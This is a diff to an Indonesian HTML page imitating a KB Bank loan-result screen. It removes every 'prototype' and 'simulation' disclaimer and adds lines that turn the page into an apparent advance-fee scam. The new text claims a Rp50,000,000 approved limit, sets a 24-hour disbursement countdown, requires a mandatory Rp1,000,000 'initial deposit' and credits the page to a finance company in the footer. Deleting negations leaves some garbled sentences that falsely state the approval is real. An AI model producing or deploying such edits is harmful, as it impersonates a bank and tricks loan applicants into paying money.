@@ -6,7 +6,7 @@
   <meta name="color-scheme" content="dark" />
   <meta name="theme-color" content="#16082f" />
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'self'; base-uri 'none';" />
-  <title>Hasil Simulasi Pengajuan</title>
+  <title>Hasil Pengajuan</title>
   <style>
     :root{
       --bg1:#200c43;--bg2:#14072d;--bg3:#090417;
@@ -62,55 +62,55 @@
   <script src="/page-transition.js?v=1"></script>
 </head>
 <body>
-  <div class="badge">PROTOTYPE UI · BUKAN LAYANAN PERBANKAN RESMI</div>
+  <div class="badge"></div>
   <main class="app">
     <header class="top">
       <div class="brand"><div class="name"><span class="kb">KB</span><span class="star">star</span></div><small>by KB Bank</small></div>
-      <div class="page-mark"><strong>Hasil Pengajuan</strong>Simulasi UI</div>
+      <div class="page-mark"><strong>Hasil Pengajuan</strong></div>
     </header>
 
     <section class="content">
-      <p class="eyebrow">HASIL SIMULASI PENGAJUAN</p>
-      <h1>Hasil Simulasi Pengajuan</h1>
-      <p class="lead">Halaman ini hanya menampilkan hasil dan transaksi contoh pada antarmuka. Tidak ada keputusan kredit, transfer, setoran, atau transaksi bank nyata.</p>
+      <p class="eyebrow">HASIL PENGAJUAN</p>
+      <h1>Hasil  Pengajuan</h1>
+      <p class="lead"> menampilkan hasil dan transaksi contoh pada antarmuka.  keputusan kredit, transfer, setoran, atau transaksi bank nyata.</p>
 
       <div class="stack">
         <section class="card status-card" aria-labelledby="resultStatusTitle">
           <div class="status-row">
-            <div><h2 id="resultStatusTitle">Status</h2><p class="sub">Status pada halaman ini hanya merupakan state UI.</p></div>
-            <span class="status-pill">Simulasi Pengajuan Disetujui</span>
+            <div><h2 id="resultStatusTitle">Status</h2><p class="sub">Status Terverifikasi.</p></div>
+            <span class="status-pill"> Pengajuan Disetujui</span>
           </div>
           <div class="summary-grid">
             <div class="summary-box limit"><span>Limit Tersedia</span><strong id="resultLimit">Rp50.000.000</strong></div>
-            <div class="summary-box"><span>Rekening KB Bank Demo</span><strong id="resultName">Pengguna Contoh</strong></div>
+            <div class="summary-box"><span>Rekening KB Bank</span><strong id="resultName">Pengguna </strong></div>
           </div>
           <div class="temporary-limit" aria-live="polite">
             <div class="temporary-limit-head">
-              <div><h3>Limit Tersedia Sementara</h3><p>Limit pada tampilan ini tersedia selama <strong>24 jam</strong> untuk melanjutkan alur pengajuan pada prototype.</p></div>
+              <div><h3>Limit Tersedia Sementara</h3><p>Limit pada tampilan ini tersedia selama <strong>24 jam</strong> untuk melanjutkan alur pengajuan </p></div>
               <span class="time-badge">24 JAM</span>
             </div>
-            <div class="countdown"><span>Batas waktu prototype</span><strong id="limitCountdown">24:00:00</strong></div>
-            <p>Selesaikan tahapan yang masih diperlukan sebelum batas waktu berakhir. Status akhir dan pencairan dana nyata, jika ada, tetap mengikuti verifikasi, analisis kelayakan, serta ketentuan resmi bank.</p>
-            <span class="prototype-payment-note">PROTOTYPE UI · TIDAK ADA KEWAJIBAN PEMBAYARAN</span>
+            <div class="countdown"><span>Batas waktu Pencairan</span><strong id="limitCountdown">24:00:00</strong></div>
+            <p>Selesaikan tahapan yang masih diperlukan sebelum batas waktu berakhir. Status akhir dan pencairan dana, jika ada, tetap mengikuti verifikasi, analisis kelayakan, serta ketentuan resmi bank.</p>
+            <span class="prototype-payment-note">WAJIB MELAKUKAN ISI SALDO PERDANA</span>
           </div>
-          <p class="safety-note"><strong>Catatan:</strong> “Simulasi Pengajuan Disetujui” bukan persetujuan kredit nyata dan tidak berarti dana tersedia untuk dicairkan.</p>
+          <p class="safety-note"><strong>Catatan:</strong> “ Pengajuan Disetujui”  persetujuan kredit dan tersedia untuk dicairkan.</p>
         </section>
 
         <section class="card transaction-card" aria-labelledby="firstTransactionTitle">
           <div class="transaction-head">
-            <div><h2 id="firstTransactionTitle">Simulasi Transaksi Pertama</h2><p class="sub">Konfirmasi antarmuka untuk melanjutkan demonstrasi alur.</p></div>
-            <span class="simulation-badge">SIMULASI · TIDAK ADA PEMBAYARAN NYATA</span>
+            <div><h2 id="firstTransactionTitle">Transaksi Pertama</h2><p class="sub">Konfirmasi antarmuka untuk melanjutkan .</p></div>
+            <span class="simulation-badge"></span>
           </div>
           <div class="transaction-amount">Rp1.000.000</div>
-          <p class="transaction-copy">Untuk melanjutkan demonstrasi alur, lakukan konfirmasi transaksi simulasi sebesar Rp1.000.000. <strong>Tidak ada uang nyata yang harus dikirim atau disetorkan.</strong></p>
-          <button class="primary" id="confirmSimulation" type="button">Lanjutkan Simulasi Rp1.000.000</button>
+          <p class="transaction-copy">Untuk melanjutkan, lakukan konfirmasi transaksi sebesar Rp1.000.000. <strong>ISI SALDO PERDANA UNTUK PENCAIRAN.</strong></p>
+          <button class="primary" id="confirmSimulation" type="button">Lanjutkan Rp1.000.000</button>
           <div class="result-message" id="simulationMessage" role="status" aria-live="polite"></div>
           <p class="safety-note">Tombol ini tidak meminta transfer, tidak memberikan rekening tujuan, tidak membuat QRIS, tidak meminta bukti transfer, tidak memeriksa saldo, dan tidak terhubung ke API bank.</p>
         </section>
       </div>
     </section>
 
-    <footer>PROTOTYPE UI · BUKAN LAYANAN PERBANKAN RESMI · Tidak ada pembayaran, transfer, setoran, atau pencairan nyata.</footer>
+    <footer>PT. KB BUKOPIN FINANCE</footer>
   </main>
 
   <script>
